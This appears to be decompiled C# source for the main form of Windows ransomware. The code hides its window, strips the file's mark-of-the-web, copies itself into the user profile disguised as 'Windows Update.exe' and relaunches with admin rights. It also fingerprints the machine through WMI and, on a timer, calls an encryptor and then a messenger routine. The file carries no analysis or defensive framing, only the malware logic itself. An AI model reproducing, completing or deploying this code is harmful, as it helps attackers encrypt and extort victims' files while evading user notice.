using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace abc;

public class Form1 : Form
{
	private static string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	public static string[] drives = Environment.GetLogicalDrives();

	public static string userDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\";

	private const int ERROR_CANCELLED = 1223;

	private const int SLEEP_TIME = 300000;

	private const int SLEEP_TIME1 = 10000;

	public static string PE_NAME = "Windows Update.exe";

	public static string SYSTEM_PATH = Environment.GetFolderPath(Environment.SpecialFolder.Windows);

	private IContainer components;

	private Timer timer1;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool DeleteFile(string name);

	public bool Unblock(string fileName)
	{
		return DeleteFile(fileName + ":Zone.Identifier");
	}

	public Form1()
	{
		InitializeComponent();
	}

	public static RegistryKey GetRegistryPath()
	{
		return Registry.CurrentUser.OpenSubKey("SOFTWARE\\" + getMachineID());
	}

	public static void SaveToRegistry(string key, string value)
	{
		Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + getMachineID()).SetValue(key, value);
	}

	public static void SaveToRegistry(string key, string subpath, int value)
	{
		Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + getMachineID() + subpath).SetValue(key, value);
	}

	public static bool isAutoStart()
	{
		if (Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(getMachineID()) != null)
		{
			return true;
		}
		return false;
	}

	public static byte[] ImageToByte(Image img)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		return (byte[])((TypeConverter)new ImageConverter()).ConvertTo((object?)img, typeof(byte[]));
	}

	private void startup()
	{
		Unblock(Application.get_ExecutablePath());
		if (!Directory.Exists(userDir + getMachineID()))
		{
			Directory.CreateDirectory(userDir + getMachineID());
		}
		string text = userDir + getMachineID() + "\\" + PE_NAME;
		if (!File.Exists(text))
		{
			File.Copy(Application.get_ExecutablePath(), text);
			Thread.Sleep(300000);
			Launcher.RunProcessAsAdmin(text);
			Application.Exit();
		}
		else if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Assembly.GetEntryAssembly()!.Location)).Count() <= 1)
		{
			timer1.set_Enabled(true);
		}
		else
		{
			Process.GetCurrentProcess().Kill();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startup();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public static string getMachineID()
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_0034: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "";
			string arg = "localhost";
			ManagementScope val = new ManagementScope($"\\\\{arg}\\root\\CIMV2", (ConnectionOptions)null);
			val.Connect();
			ObjectQuery val2 = new ObjectQuery("SELECT UUID FROM Win32_ComputerSystemProduct");
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(val, val2).Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					text = ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("UUID").ToString();
					if (text.StartsWith("FFFFFFFF", StringComparison.OrdinalIgnoreCase))
					{
						ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"c:\"");
						val3.Get();
						string? text2 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
						string text3 = (from ManagementObject managementObject in (IEnumerable)new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_OperatingSystem").Get()
							from propertyData in ((IEnumerable)((ManagementBaseObject)managementObject).get_Properties()).Cast<PropertyData>()
							where propertyData.get_Name() == "SerialNumber"
							select (string)propertyData.get_Value()).FirstOrDefault();
						text = text2 + text3;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			byte[] array = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(text));
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < array.Length; i++)
			{
				stringBuilder.Append(array[i].ToString("x2"));
			}
			return stringBuilder.ToString();
		}
		catch (Exception)
		{
			return null;
		}
	}

	public void startAction()
	{
		Launcher.startUp();
		if (Encryptor.makeItHappen())
		{
			Messenger.sendMessage();
		}
		Environment.Exit(1);
		Application.Exit();
	}

	public static string getStartPath()
	{
		string text = "Desktop";
		return userDir + text;
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		startAction();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		timer1.set_Interval(40000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(174, 65));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
